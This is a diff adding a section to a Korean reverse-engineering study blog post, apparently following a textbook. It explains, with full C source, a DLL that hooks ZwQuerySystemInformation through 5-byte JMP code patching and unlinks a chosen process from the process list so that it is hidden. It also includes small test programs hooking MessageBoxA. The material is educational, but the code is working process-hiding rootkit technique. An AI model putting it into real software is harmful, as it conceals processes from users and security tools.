@@ -631,6 +631,392 @@ __declspec(dllexport) void SetProcName(LPCTSTR szProcName)
 
 잠시 끗
 
+-----------------------------------------------------19.03.04
+
+#### SetProcName() & PreProcessor
+
+먼저 Export 함수인 SetProcName() 함수부터 확인한다.
+
+```c
+// global variable (in sharing memory)
+#pragma comment(linker, "/SECTION:.SHARE,RWS")
+#pragma data_seg(".SHARE")
+    TCHAR g_szProcName[MAX_PATH] = {0,};
+#pragma data_seg()
+
+#ifdef __cplusplus
+extern "C" {
+#endif
+__declspec(dllexport) void SetProcName(LPCTSTR szProcName)
+{
+    _tcscpy_s(g_szProcName, szProcName);
+}
+#ifdef __cplusplus
+}
+#endif
+```
+
+먼저 `.SHARE` 라는 이름의 공유 메모리 섹션을 생성한다. 후 하나하나 찾아가며 상세하게 설명을 해본다.
+
+먼저 `pragma comment` 지시자는 msdn에 오브젝트 파일 또는 실행파일에 주석을 배치한다(?) 라고 번역이 되어있다..; 일단 대상 아키텍쳐와 같이 컴파일러 옵션을 지정할 수 있다고 한다.
+
+꽤 많은 기능을 가지고 있는데 대표적으로 몇가지 살펴보면, `ImageBase`의 주소 설정도 가능하다.
+`#pragma comment(linker,"/BASE:0x10000000")` 을 써서 컴파일 하면 실제 `ImageBase`가 변경되는 것을 확인할 수 있다. 또한 섹션의 속성변경도 가능한데 `#pragma comment(linker,"/SECTION:.text,EWR")` 을 전처리 구문으로 넣으면 `.text` 영역의 실행,쓰기,읽기 권한이 활성화 되는 것을 볼 수 있다.
+
+위의 전처리구문을 해석하자면 `.SHARE` 섹션을 읽기,쓰기,공유 권한을 활성화 시키는 것으로 이해할 수 있다.(`#pragma comment(linker,"/SECTION:.SHARE,RWS")`)
+
+`#pragma data_seg`는 msdn에 `.obj 파일에 초기화 된 변수가 저장되는 특정 데이터 세그먼트를 지정한다` 라고 되어있다. 네이버든 구글에 검색하면 메모리 공유를 위해 사용되는 것을 알 수 있다.
+
+후킹을 하려는 DLL이 타겟 프로세스에 삽입되어 있을 때 공유섹션을 이용해 데이터를 전달할 수 있다. 해당 `data_seg`가 바로 그 공유섹션을 선언하는 부분이다.
+
+```c
+#pragma data_seg(".SHARE")	// 세그먼트 시작 선언, 미지정 시 .data 섹션으로 포함
+    TCHAR g_szProcName[MAX_PATH] = {0,};	// 공유 섹션에 저장될 변수를 선언
+#pragma data_seg()	// 세그먼트 종료, 해당 공유섹션에서는 g_szProcName 변수만 사용
+```
+
+위의 주석대로이다. 즉 해당 섹션의 데이터들을 외부에서도 접근이 가능해지는 것이다.
+
+```c
+#ifdef __cplusplus
+extern "C" {
+#endif
+__declspec(dllexport) void SetProcName(LPCTSTR szProcName)
+{
+    _tcscpy_s(g_szProcName, szProcName);
+}
+#ifdef __cplusplus
+}
+#endif
+```
+
+전처리구문은 넘어가고... `_tcscpy_s()` 함수를 통해 은폐  프로세스 이름을 `g_szProcName`에 저장한다. 해당 함수는 export 함수로써 `HookProc.exe`에 의해서 호출된다. (dllimport,export에 대해 검색해보면 좋은 정보가 많이있다.)
+
+다음은 dllmain 함수이다.
+
+#### DllMain()
+
+```c
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
+{
+    char            szCurProc[MAX_PATH] = {0,};
+    char            *p = NULL;
+
+    // #1. 예외처리
+    // 현재 프로세스가 HookProc.exe 라면 후킹하지 않고 종료
+    GetModuleFileNameA(NULL, szCurProc, MAX_PATH);
+    p = strrchr(szCurProc, '\\');
+    if( (p != NULL) && !_stricmp(p+1, "HideProc.exe") )
+        return TRUE;
+
+    switch( fdwReason )
+    {
+        // #2. API Hooking
+        case DLL_PROCESS_ATTACH : 
+        hook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, 
+                     (PROC)NewZwQuerySystemInformation, g_pOrgBytes);
+        break;
+
+        // #3. API Unhooking 
+        case DLL_PROCESS_DETACH :
+        unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, 
+                       g_pOrgBytes);
+        break;
+    }
+
+    return TRUE;
+}
+```
+
+하나씩 분석해본다.
+
+```c
+    char            szCurProc[MAX_PATH] = {0,};
+    char            *p = NULL;
+
+    // #1. 예외처리
+    // 현재 프로세스가 HookProc.exe 라면 후킹하지 않고 종료
+    GetModuleFileNameA(NULL, szCurProc, MAX_PATH);
+    p = strrchr(szCurProc, '\\');
+    if( (p != NULL) && !_stricmp(p+1, "HideProc.exe") )
+        return TRUE;
+```
+
+예외처리 구문이라고 되어있다. `GetModuleFileNameA` 함수에 첫번째 인자를 `NULL`을 보냄으로써 현재 프로세스의 절대경로를 가지고 온다. 
+`strrchr` 함수를 이용해 `\` 문자를 찾고 마지막 위치에 포인터를 받아 `p` 에 저장한다.(`c:\work\test.exe`의 경우 `\test.exe`를 반환)
+
+그리고 조건문을 통해 `p+1`의 값이 `HideProc.exe`일 경우 후킹을 하지 않도록 예외처리를 만든 것 이다. 해당 위의 함수 사용을 출력하여 확인할 수 있는 소스코드를 만들어봤다.
+
+```c
+#include <stdio.h>
+#include <Windows.h>
+
+void main()
+{
+    char szCurProc[MAX_PATH] = {0,};
+    char *p = NULL;
+    printf("Fully Path length = %p\n",GetModuleFileNameA(NULL, szCurProc, MAX_PATH));
+	printf("strrchr() = %s\n",strrchr(szCurProc,'\\'));
+	p=strrchr(szCurProc,'\\');
+	if( (p != NULL) && !_stricmp(p+1, "getmodule.exe") )
+        printf("Current Module Name = %s\n",p+1);
+}
+```
+
+출력해보면 어떤 원리인지 쉽게 이해할 수 있다.
+
+```c
+    switch( fdwReason )
+    {
+        // #2. API Hooking
+        case DLL_PROCESS_ATTACH : 
+        hook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, 
+                     (PROC)NewZwQuerySystemInformation, g_pOrgBytes);
+        break;
+
+        // #3. API Unhooking 
+        case DLL_PROCESS_DETACH :
+        unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, 
+                       g_pOrgBytes);
+        break;
+    }
+
+    return TRUE;
+}
+```
+
+DLL 인젝션과 마찬가지로 이벤트 케이스를 나누어 `hook_by_code`와 `unhook_by_code` 함수를 호출한다.
+
+#### hook_by_code()
+
+이제 실제 코드패치를 해서 API후킹을 하는 함수를 분석해본다.
+
+```c
+BOOL hook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew, PBYTE pOrgBytes)
+{
+    FARPROC pfnOrg;
+    DWORD dwOldProtect, dwAddress;
+    BYTE pBuf[5] = {0xE9, 0, };
+    PBYTE pByte;
+
+    // 후킹 대상 API 주소를 구한다
+    pfnOrg = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
+    pByte = (PBYTE)pfnOrg;
+
+    // 만약 이미 후킹 되어 있다면 return FALSE
+    if( pByte[0] == 0xE9 )
+        return FALSE;
+
+    // 5 byte 패치를 위하여 메모리에 WRITE 속성 추가
+    VirtualProtect((LPVOID)pfnOrg, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);
+
+    // 기존 코드 (5 byte) 백업
+    memcpy(pOrgBytes, pfnOrg, 5);
+
+    // JMP 주소 계산 (E9 XXXX)
+    // => XXXX = pfnNew - pfnOrg - 5
+    dwAddress = (DWORD)pfnNew - (DWORD)pfnOrg - 5;
+    memcpy(&pBuf[1], &dwAddress, 4);
+
+    // Hook - 5 byte 패치 (JMP XXXX)
+    memcpy(pfnOrg, pBuf, 5);
+
+    // 메모리 속성 복원
+    VirtualProtect((LPVOID)pfnOrg, 5, dwOldProtect, &dwOldProtect);
+    
+    return TRUE;
+}
+```
+
+우선 함수 호출 시 전달되는 파라미터를 확인하면 `hook_by_code(DEF_NTDLL,DEF_ZWQUERYSYSTEMINFORMATION,(PROC)NewZwQuerySystemInformation,g_pOrgBytes)` 로 호출하는 것을 볼 수 있다.
+즉 `LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew, PBYTE pOrgBytes` 을 순서대로 역할을 보면 후킹 할 API의 라이브러리, 후킹 할 API, 후킹 함수의 주소, 원본 5byte(이해가 안되면 이전 포스팅 확인)라고 볼 수 있다.
+
+ 맨 앞에 동작방식에 써놓은 것 처럼 `JMP` 명령을 이용해 후킹 함수를 사용한다. x86 명령에서 `JMP`는 opcode로 0xE9이다. 그리고 뒤에 주소 4byte가 따라오게 된다. 현재 중요한 점은 `E9 XXXXXXXX` 에서 x가 절대 값이 아니라 상대주소라는 점이다. 다음과 같은 공식으로 상대 거리를 구할 수 있다.
+
+`XXXXXXXX = JMP 할 주소 - 현재 명령어 주소 - 명령어 길이(5)` 
+
+예를 들어 0x402000 에 있는 JMP 명령어에서 0x401000으로 점프를 하는 경우 opcode는 다음과 같이 `0x401000 - 0x402000 - 5(jmp 명령 길이)=0xFFFFEFFB` 으로 `E9 FBEFFFFF`이 된다.
+
+후 그래서 증명하기 위해 해당 예제코드를 기반으로 만들어보았다.
+
+```c
+#include <stdio.h>
+#include <Windows.h>
+
+void test2()
+{
+	printf("\nCall Success\n");
+}
+
+void main()
+{
+	MEMORY_BASIC_INFORMATION infos;
+	FARPROC pfnOrg;
+    DWORD dwOldProtect, dwAddress;
+    BYTE pBuf[5] = {0xE9, 0, };	// JMP XXXXXXXX
+    PBYTE pByte;
+	LPCSTR szDllName; LPCSTR szFuncName; PROC pfnNew; PBYTE pOrgBytes[5]={0,};
+	szDllName="user32.dll";
+	szFuncName="MessageBoxA";
+	pfnNew=(PROC)test2;
+	printf("test2() Address = %p\n",pfnNew);
+	
+    // 후킹 대상 API 주소를 구한다
+    pfnOrg = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
+    pByte = (PBYTE)pfnOrg;	//MessageBoxA 함수의 (opcode)
+	printf("MessageBoxA Address = %p\n",pfnOrg);
+	printf("MessageBoxA 5byte opcode = ");
+	for(int i=0;i<sizeof(pByte);i++)
+	{
+		printf("%x",pByte[i]);
+	}
+	VirtualProtect((LPVOID)pfnOrg, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);	//보호속성 변경
+	VirtualQuery((LPVOID)pfnOrg,&infos,sizeof(infos));
+	printf("\nProtect Flag = 0x%x",infos.Protect);
+
+	
+    memcpy(pOrgBytes, pfnOrg, 5);	// 원본 5byte 백업
+	printf("\nbackup = %x\n",*pOrgBytes);
+    dwAddress = (DWORD)pfnNew - (DWORD)pfnOrg - 5;	//test2()주소 - MessageBoxA 시작주소 - 5byte
+	memcpy(&pBuf[1], &dwAddress, 4); //pBuf[0] = e9, pBuf[1] 부터 new opcode를 삽입
+	printf("New OPCode = ");
+	for(int i=0;i<sizeof(pBuf);i++)
+	{
+		if(i==0){ printf("%X ",pBuf[i]);}
+		printf("%X",pBuf[i]);
+	}
+    memcpy(pfnOrg, pBuf, 5);	//MessageBoxA 함수의 5byte를 새로운 Opcode로 변조(JMP test2())
+	VirtualProtect((LPVOID)pfnOrg, 5, dwOldProtect, &dwOldProtect);	//보호속성을 복원
+	MessageBoxA(0,"hello","Shh0ya",MB_OK);
+}
+```
+
+확실히 직접 검색해보고 짜보는게 매우 도움이 된다. 음 보호속성을 보기위해 `VirtualQuery`API 함수를 이용했고, `MessageBoxA` 함수를 후킹하여 내가 의도한 함수를 호출하는 방식이다. 컴파일하여 실행하면 `MessageBoxA`는 호출되지 않고 `test2`함수가 호출되는 것을 확인할 수 있다.
+
+#### unhook_by_code()
+
+```c
+BOOL unhook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PBYTE pOrgBytes)
+{
+    FARPROC pFunc;
+    DWORD dwOldProtect;
+    PBYTE pByte;
+
+    // API 주소 구한다
+    pFunc = GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
+    pByte = (PBYTE)pFunc;
+
+    // 만약 이미 언후킹 되어 있다면 return FALSE
+    if( pByte[0] != 0xE9 )
+        return FALSE;
+
+    // 원래 코드(5 byte)를 덮어쓰기 위해 메모리에 WRITE 속성 추가
+    VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);
+
+    // Unhook
+    memcpy(pFunc, pOrgBytes, 5);
+
+    // 메모리 속성 복원
+    VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &dwOldProtect);
+    return TRUE;
+}
+```
+
+`hook_by_code` 함수에 대부분의 api 및 로직을 설명해놔서 쉽게 이해할 수 있다. 핵심은 역시 원본 5byte 코드를 다시 덮어씌워주는데 있다.
+
+#### NewZwQuerySystemInformation()
+
+```c++
+NTSTATUS WINAPI NewZwQuerySystemInformation(
+                SYSTEM_INFORMATION_CLASS SystemInformationClass, 
+                PVOID SystemInformation, 
+                ULONG SystemInformationLength, 
+                PULONG ReturnLength)
+{
+    NTSTATUS status;
+    FARPROC pFunc;
+    PSYSTEM_PROCESS_INFORMATION pCur, pPrev;
+    char szProcName[MAX_PATH] = {0,};
+    
+    // 작업 전에 unhook
+    unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, g_pOrgBytes);
+
+    // original API 호출
+    pFunc = GetProcAddress(GetModuleHandleA(DEF_NTDLL), 
+                           DEF_ZWQUERYSYSTEMINFORMATION);
+    status = ((PFZWQUERYSYSTEMINFORMATION)pFunc)
+              (SystemInformationClass, SystemInformation, 
+              SystemInformationLength, ReturnLength);
+
+    if( status != STATUS_SUCCESS )
+        goto __NTQUERYSYSTEMINFORMATION_END;
+
+    // SystemProcessInformation 인 경우만 작업함
+    if( SystemInformationClass == SystemProcessInformation )
+    {
+        // SYSTEM_PROCESS_INFORMATION 타입 캐스팅
+        // pCur 는 single linked list 의 head
+        pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
+
+        while(TRUE)
+        {
+            // 프로세스 이름 비교
+            // g_szProcName = 은폐하려는 프로세스 이름
+            // (=> SetProcName() 에서 세팅됨)
+            if(pCur->Reserved2[1] != NULL)
+            {
+                if(!_tcsicmp((PWSTR)pCur->Reserved2[1], g_szProcName))
+                {
+                    // 연결 리스트에서 은폐 프로세스 제거
+                    if(pCur->NextEntryOffset == 0)
+                        pPrev->NextEntryOffset = 0;
+                    else
+                        pPrev->NextEntryOffset += pCur->NextEntryOffset;
+                }
+                else		
+                    pPrev = pCur;
+            }
+
+            if(pCur->NextEntryOffset == 0)
+                break;
+
+            // 연결 리스트의 다음 항목
+            pCur = (PSYSTEM_PROCESS_INFORMATION)
+                    ((ULONG)pCur + pCur->NextEntryOffset);
+        }
+    }
+
+__NTQUERYSYSTEMINFORMATION_END:
+
+    // 함수 종료 전에 다시 API Hooking
+    hook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, 
+                 (PROC)NewZwQuerySystemInformation, g_pOrgBytes);
+
+    return status;
+}
+```
+
+일단 기본 `ZwQuerySystemInformation` API에 대해 알아봐야 한다. zQuery라고 짧게 줄여 사용하겠다. zQuery의 함수 원형은 다음과 같다.
+
+```c
+NTSTATUS WINAPI ZwQuerySystemInformation(
+  _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,
+  _Inout_   PVOID                    SystemInformation,
+  _In_      ULONG                    SystemInformationLength,
+  _Out_opt_ PULONG                   ReturnLength
+);
+```
+
+요건 정말 많이 찾아봐야했다. 책에서도 이 부분에 대한 설명은 좀 부족하다고 느꼈다.
+
+**`SystemlnformationClass` 파라미터를 `SystemProcessInformation(5)`로 세팅하고, `ZwQuerySystemlnformation` API를 호출하면, `SysternInformation`파라미터에 `SYSTEM_PROCESS_INFORMATION`  단방향 연결 리스트(single linked list)의 시작 주소가 저장, 바로 이 구조체 연결 리스트에 실행 중인 모든 프로세스의 정보가 담겨 있다.**
+
+라고 책에는 나와있다. 뭐 그런가보다 하고 넘어갈 수 있지만 좀 어려웠다. 찾아보면서 어느정도 이해는 되었으나 대부분 블로그에 딱 저정도만 있는 것을 볼 수 있다. `NTSTATUS` 부터 `SYSTEM_INFO` 구조체까지 모두 찾아보는게 좋다. 참고로 `SYSTEM_INFO` 구조체는 `WinBase.h` 문서안에 정의되어있다.
+
+ 그 외에는 주석처리를 살펴보면서 보면 된다. 휠 내리는 속도를 3초 정도 마다 내려주면 좋닼
+
+끗 
+
 # [+] Reference
 
 1. ***리버싱 핵심 원리***
